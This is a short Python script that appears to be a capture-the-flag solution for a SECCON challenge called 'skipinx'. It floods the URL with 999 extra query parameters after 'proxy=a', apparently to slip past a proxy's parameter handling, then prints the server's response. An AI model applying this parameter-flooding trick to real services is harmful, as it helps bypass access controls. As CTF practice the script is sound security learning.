import urllib.request
s = 'http://skipinx.seccon.games:8080/?'
s += 'proxy=a'
for x in range(999):
    s += '&a=a'
with urllib.request.urlopen(s) as f:
    print(f.read())